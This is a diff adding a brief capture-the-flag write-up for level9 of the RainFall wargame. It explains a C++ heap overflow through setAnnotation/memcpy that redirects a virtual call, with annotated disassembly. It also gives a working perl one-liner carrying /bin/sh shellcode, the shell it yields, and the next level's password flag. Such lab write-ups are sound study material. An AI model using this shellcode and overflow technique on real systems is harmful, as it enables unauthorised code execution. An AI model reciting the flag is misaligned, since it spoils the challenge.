@@ -1,0 +1,18 @@
+As N instances are dynamically allocated and ASLR is disabled
+all addresses returned by new will be consecutives.
+
+We can overflow the first one with SetAnnotation to modify the second one
+so that when the program will try to execute '+' operator before return, it will instead call our shellcode
+
+0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc> //Overflow happens in this function (memcpy)
+0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]	// $esp+10 = 0x0804a078 
+0x08048680 <+140>:	mov    eax,DWORD PTR [eax]		// $eax = 0x804a078		*eax = 0x804a00c
+0x08048682 <+142>:	mov    edx,DWORD PTR [eax]		// $eax = 0x804a00c		*eax = 0x804a00c
+
+level9@RainFall:~$ ./level9 `perl -e 'print "\x10\xa0\x04\x08" . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\
+\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\
+\xff/bin/sh" . "A"x59 . "\x0c\xa0\x04\x08"'`
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
